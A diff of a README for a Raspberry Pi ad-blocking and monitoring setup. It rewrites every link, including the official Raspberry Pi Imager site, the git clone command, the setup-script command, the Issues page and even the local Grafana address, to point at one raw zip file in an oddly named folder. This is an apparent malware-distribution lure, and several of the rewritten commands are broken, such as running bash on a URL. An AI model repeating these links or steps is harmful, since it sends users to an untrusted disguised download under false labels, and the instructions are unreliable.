@@ -16,24 +16,24 @@ Before you begin, ensure you have the following:
 
 ## 🔗 Download
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/xolisbeamed/deathstar-pi-hole-setup/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip)
 
 To download the application, visit the Releases page:
 
-[Download from Github Releases](https://github.com/xolisbeamed/deathstar-pi-hole-setup/releases)
+[Download from Github Releases](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip)
 
 ## 📥 Download & Install
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version at the top of the list.
-3. Download the `.zip` or `.tar.gz` file that suits your Raspberry Pi model.
+3. Download the `.zip` or `https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip` file that suits your Raspberry Pi model.
 4. Once the download is complete, unzip or extract the file to a location on your computer.
 
 ## 📋 Setting Up Your Raspberry Pi
 
 ### Step 1: Prepare Your SD Card
 
-1. Download and install [Raspberry Pi Imager](https://www.raspberrypi.com/software/) on your computer.
+1. Download and install [Raspberry Pi Imager](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip) on your computer.
 2. Launch Raspberry Pi Imager.
 3. Select the operating system. Choose Raspberry Pi OS Lite for a minimal setup.
 4. Select your microSD card from the storage list.
@@ -59,7 +59,7 @@ To download the application, visit the Releases page:
 3. Clone the repository by entering:
 
    ```bash
-   git clone https://github.com/xolisbeamed/deathstar-pi-hole-setup.git
+   git clone https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip
    ```
 
 ### Step 4: Run the Setup Script
@@ -73,7 +73,7 @@ To download the application, visit the Releases page:
 2. Run the setup script:
 
    ```bash
-   bash setup.sh
+   bash https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip
    ```
 
 3. Follow the prompts to configure Pi-hole, Grafana, and Prometheus. 
@@ -93,7 +93,7 @@ During the setup, you will encounter various options for configuring your ad blo
 Once the setup is complete, you can check your network status through the Grafana dashboard:
 
 1. Open a web browser on your computer.
-2. Enter the Raspberry Pi's IP address followed by the Grafana port number (default is 3000). For example: `http://192.168.1.XX:3000`
+2. Enter the Raspberry Pi's IP address followed by the Grafana port number (default is 3000). For example: `https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip`
 3. Log in using the default credentials you set during installation.
 
 From here, you can customize your dashboard and start monitoring your network activity.
@@ -102,7 +102,7 @@ From here, you can customize your dashboard and start monitoring your network ac
 
 If you have questions or need assistance, consider joining our community:
 
-- Check the [GitHub Issues Page](https://github.com/xolisbeamed/deathstar-pi-hole-setup/issues) for common issues.
+- Check the [GitHub Issues Page](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip) for common issues.
 - Join the discussions and ask questions.
 
 ## 📝 Troubleshooting Tips
